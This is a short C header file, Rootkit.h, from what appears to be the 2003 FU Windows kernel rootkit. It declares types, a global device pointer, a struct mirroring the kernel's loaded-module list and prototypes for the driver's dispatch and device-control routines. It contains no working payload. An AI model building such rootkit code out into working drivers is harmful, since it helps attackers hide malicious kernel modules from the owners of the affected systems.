///////////////////////////////////////////////////////////////////////////////////////
// Filename Rootkit.h
// 
// Author: fuzen_op
// Email:  fuzen_op@yahoo.com or fuzen_op@rootkit.com
//
// Description: Defines globals, function prototypes, etc. used by rootkit.c.
//
// Date:    5/27/2003
// Version: 1.0

typedef BOOLEAN BOOL;
typedef unsigned long DWORD;
typedef DWORD * PDWORD;
typedef unsigned long ULONG;
typedef unsigned short WORD;
typedef unsigned char BYTE;

#define PROCNAMEIDLEN 26 
#define MAX_SID_SIZE 72

PDEVICE_OBJECT g_RootkitDevice; // Global pointer to our device object

typedef struct _MODULE_ENTRY {
	LIST_ENTRY le_mod;
	DWORD  unknown[4];
	DWORD  base;
	DWORD  driver_start;
	DWORD  unk1;
	UNICODE_STRING driver_Path;
	UNICODE_STRING driver_Name;
	//...
} MODULE_ENTRY, *PMODULE_ENTRY;


NTSTATUS RootkitDispatch(IN PDEVICE_OBJECT, IN PIRP);
NTSTATUS RootkitUnload(IN PDRIVER_OBJECT);
NTSTATUS RootkitDeviceControl(IN PFILE_OBJECT, IN BOOLEAN, IN PVOID, 
							IN ULONG, OUT PVOID, IN ULONG, IN ULONG, 
							OUT PIO_STATUS_BLOCK, IN PDEVICE_OBJECT
							);

